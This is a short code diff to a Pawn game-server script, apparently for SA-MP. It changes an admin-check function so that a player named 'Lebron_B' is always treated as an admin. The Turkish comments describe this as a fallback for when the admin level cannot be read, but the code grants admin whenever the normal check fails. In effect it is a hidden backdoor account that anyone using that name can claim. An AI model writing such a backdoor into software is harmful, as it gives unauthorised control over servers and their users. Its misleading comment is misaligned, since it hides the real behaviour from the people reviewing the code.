@@ -37,6 +37,9 @@
 #define DLG_AREP_ACT    7125
 #define DLG_AREP_NOTE   7126
 
+// Admin seviyesi diger script'ten okunamazsa admin sayilacak oyuncu adi
+#define YEDEK_ADMIN     "Lebron_B"
+
 #define REP_COOLDOWN    20
 #define REP_MAXLIST     20
 
@@ -176,6 +179,10 @@ stock KG_IsAdmin(playerid)
 {
     new lvl = CallRemoteFunction("RP_GetAdminLevel", "i", playerid);
     if (lvl >= 1 || IsPlayerAdmin(playerid)) return 1;
+    // Yedek: ana sistemden admin seviyesi okunamazsa bu isimler admin sayilir
+    new nm[MAX_PLAYER_NAME + 1];
+    GetPlayerName(playerid, nm, sizeof nm);
+    if (!strcmp(nm, YEDEK_ADMIN, true)) return 1;
     return 0;
 }
 
